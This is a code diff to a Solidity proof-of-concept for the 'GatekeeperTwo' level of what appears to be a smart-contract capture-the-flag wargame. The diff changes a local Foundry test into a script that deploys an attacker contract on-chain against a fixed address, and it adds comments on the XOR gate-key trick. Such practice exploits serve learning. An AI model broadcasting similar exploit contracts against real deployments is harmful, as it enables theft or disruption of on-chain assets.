@@ -1,22 +1,23 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.6.0;
 
-import "forge-std/Test.sol";
+import "forge-std/Script.sol";
 import "src/level14.sol";
 
-contract POC is Test {
+contract POC is Script {
     GatekeeperTwo level14;
 
     function setUp() public {
-        level14 = new GatekeeperTwo();
+        level14 = GatekeeperTwo(0x1bc245001ae36eB647Ea047a69bE0883f066f209);
     }
 
-    function test() public {
+    function run() public {
+        vm.startBroadcast();
         new GatekeeperTwoAttacker(level14);
+        vm.stopBroadcast();
     }
 }
 
-// 0x999d3ec583cbb470
 contract GatekeeperTwoAttacker {
     /**
     Constructor:
@@ -28,6 +29,7 @@ contract GatekeeperTwoAttacker {
     b = uint64(_gateKey);
     result = uint64(0) - 1;
 
+    https://medium.com/@imolfar/bitwise-operations-and-bit-manipulation-in-solidity-ethereum-1751f3d2e216
     a ^ b = result;
     result ^ uint64(bytes8(keccak256(abi.encodePacked(address(this)))))
      */
